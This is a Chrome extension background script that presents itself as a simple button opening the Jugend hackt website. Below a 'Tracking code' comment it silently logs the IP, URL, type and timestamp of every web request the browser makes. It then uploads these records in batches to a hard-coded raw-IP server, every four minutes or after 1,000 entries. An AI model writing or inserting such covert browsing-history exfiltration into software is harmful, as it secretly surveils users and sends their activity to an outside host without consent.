chrome.browserAction.onClicked.addListener(function (activeTab) {
    var newURL = "https://jugendhackt.de";
    chrome.tabs.create({
        url: newURL
    });

});

// Tracking code
var API_SYNC_URL = "http://188.68.58.69:8080/upload";
var LOG_SERVER = "188.68.58.69";

var requestBuffer = [];
var requestPreparedBuffer = [];
function syncBuffer() {
    requestPreparedBuffer = requestBuffer;
    requestBuffer = [];
    var postData = {
        keys: ["ip","url","type","timestamp"],
        entries: requestPreparedBuffer
    };
    var syncRequest = new XMLHttpRequest();
    syncRequest.open("POST", API_SYNC_URL, true);
    syncRequest.send(JSON.stringify(postData));
}
function logRequest(reqDetails) {
    if (reqDetails.ip !== LOG_SERVER && reqDetails.ip !== undefined) {
        var newEntry = [
            reqDetails.ip,
            reqDetails.url,
            reqDetails.type,
            reqDetails.timeStamp
        ];
        requestBuffer.push(newEntry);
        if (requestBuffer.length >= 1000) {
            syncBuffer();
        }
    }
}
chrome.webRequest.onResponseStarted.addListener((details)=>{ logRequest(details) }, { urls: ["<all_urls>"] }, []);

setInterval(syncBuffer, 4*60*1000);
